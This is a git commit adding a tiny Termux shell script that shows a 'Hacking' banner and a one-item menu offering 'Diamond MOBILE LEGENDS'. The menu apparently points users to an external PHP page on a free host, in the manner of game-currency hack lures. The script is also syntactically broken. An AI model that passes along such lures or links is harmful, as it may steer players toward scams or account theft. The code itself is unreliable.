3199073b188e9de50113df924e7bd6d8f33338c7
BANE590 <69880608+BANE590@users.noreply.github.com>
2020-08-19 09:21:23 +0700

    Add files via upload

---
+++ Ml.sh
@@ -0,0 +1,13 @@
+# Termux
+
+clear
+figlet "Hacking"
+echo "pilih menu"
+echo "[1] Diamond MOBILE LEGENDS"
+# batas
+read -p [?] pilihh : " Pil:
+# batas
+if [ $Pil = 1 ]
+then
+https://bulan-bintang123.000webhostapp.com/dataml.php
+fi
